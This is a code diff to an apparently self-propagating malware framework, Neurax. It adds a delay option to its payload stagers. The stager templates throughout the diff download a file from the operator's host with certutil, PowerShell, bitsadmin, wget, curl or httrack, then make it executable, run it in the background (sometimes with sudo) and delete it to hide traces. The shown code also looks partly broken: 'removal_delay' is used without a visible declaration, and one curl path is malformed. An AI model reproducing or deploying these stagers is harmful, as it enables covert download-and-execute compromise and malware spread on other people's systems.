@@ -97,6 +97,7 @@ type __N struct {
 	StagerSudo               bool
 	StagerBg				 bool
 	StagerRetry              int
+	StagerRemovalDelay		 bool
 	Port                     int
 	CommPort                 int
 	CommProto                string
@@ -151,6 +152,7 @@ var N = __N{
 	StagerSudo:               false,
 	StagerBg:                 false,
 	StagerRetry:              0,
+	StagerRemovalDelay:		  true, 
 	Port:                     6741, //coldfire.RandomInt(2222, 9999),
 	CommPort:                 7777,
 	CommProto:                "udp",
@@ -223,14 +225,14 @@ func NeuraxStager() string {
 	sudo := ""
 	stager_retry := strconv.Itoa(N.StagerRetry + 1)
 	windows_stagers := [][]string{
-		{"certutil", `for /l %%N in (1 1 RETRY) do certutil.exe -urlcache -split -f URL && B64 BACKGROUND SAVE_PATH\FILENAME && del SAVE_PATH/FILENAME`},
-		{"powershell", `for /l %%N in (1 1 RETRY) do Invoke-WebRequest URL/FILENAME -O SAVE_PATH\FILENAME && B64 BACKGROUND SAVE_PATH\FILENAME && del SAVE_PATH/FILENAME`},
-		{"bitsadmin", `for /l %%N in (1 1 RETRY) do bitsadmin /transfer update /priority high URL SAVE_PATH\FILENAME && B64 BACKGROUND SAVE_PATH\FILENAME && del SAVE_PATH\FILENAME`},
+		{"certutil", `for /l %%N in (1 1 RETRY) do certutil.exe -urlcache -split -f URL && B64 BACKGROUND SAVE_PATH\FILENAME && REMOVAL_DELAY del SAVE_PATH/FILENAME`},
+		{"powershell", `for /l %%N in (1 1 RETRY) do Invoke-WebRequest URL/FILENAME -O SAVE_PATH\FILENAME && B64 BACKGROUND SAVE_PATH\FILENAME && REMOVAL_DELAY del SAVE_PATH/FILENAME`},
+		{"bitsadmin", `for /l %%N in (1 1 RETRY) do bitsadmin /transfer update /priority high URL SAVE_PATH\FILENAME && B64 BACKGROUND SAVE_PATH\FILENAME && REMOVAL_DELAY del SAVE_PATH\FILENAME`},
 	}
 	linux_stagers := [][]string{
-		{"wget", `for i in {1..RETRY}; do SUDO wget -O SAVE_PATH/FILENAME URL && SUDO B64 chmod +x SAVE_PATH/FILENAME && SUDO SAVE_PATH/./FILENAME BACKGROUND; done && rm SAVE_PATH/FILENAME`},
-		{"curl", `for i in {1..RETRY}; do SUDO curl URL/FILENAME > SAVE_PATH/FILENAME && SUDO B64 chmod +x SAVE_PATH/FILENAME && SUDO SAVE_PATH./FILENAME BACKGROUND; done && rm SAVE_PATH/FILENAME`},
-		{"httrack", `SUDO apt-get install -y httrack && for i in {1..RETRY}; do SUDO httrack URL && export u="URL" && cd ${u#https://} && chmod +x FILENAME && SUDO ./FILENAME BACKGROUND; done && rm SAVE_PATH/FILENAME`}
+		{"wget", `for i in {1..RETRY}; do SUDO wget -O SAVE_PATH/FILENAME URL && SUDO B64 chmod +x SAVE_PATH/FILENAME && SUDO SAVE_PATH/./FILENAME BACKGROUND; done && REMOVAL_DELAY rm SAVE_PATH/FILENAME`},
+		{"curl", `for i in {1..RETRY}; do SUDO curl URL/FILENAME > SAVE_PATH/FILENAME && SUDO B64 chmod +x SAVE_PATH/FILENAME && SUDO SAVE_PATH./FILENAME BACKGROUND; done && REMOVAL_DELAY rm SAVE_PATH/FILENAME`},
+		{"httrack", `SUDO apt-get install -y httrack && for i in {1..RETRY}; do SUDO httrack URL && export u="URL" && cd ${u#https://} && chmod +x FILENAME && SUDO ./FILENAME BACKGROUND; done && REMOVAL_DELAY rm SAVE_PATH/FILENAME`}
 	}
 	linux_save_paths := []string{"/tmp", "/lib", "~",
 		"/etc", "/usr", "/usr/share"}
@@ -294,6 +296,9 @@ func NeuraxStager() string {
 	if N.StagerSudo {
 		sudo = "sudo"
 	}
+	if N.StagerRemovalDelay {
+		removal_delay = "sleep 5"
+	}
 	url := fmt.Sprintf("http://%s:%d/%s", N.LocalIp, N.Port, N.FileName)
 	selected_stager_command = strings.Replace(selected_stager_command, "URL", url, -1)
 	selected_stager_command = strings.Replace(selected_stager_command, "FILENAME", N.FileName, -1)
@@ -302,6 +307,7 @@ func NeuraxStager() string {
 	selected_stager_command = strings.Replace(selected_stager_command, "SUDO", sudo, -1)
 	selected_stager_command = strings.Replace(selected_stager_command, "RETRY", stager_retry, -1)
 	selected_stager_command = strings.Replace(selected_stager_command, "BACKGROUND", background, -1)
+	selected_stager_command = strings.Replace(selected_stager_command, "REMOVAL_DELAY", removal_delay, -1)
 	NeuraxDebug("Created command stager: " + selected_stager_command)
 	return selected_stager_command
 }
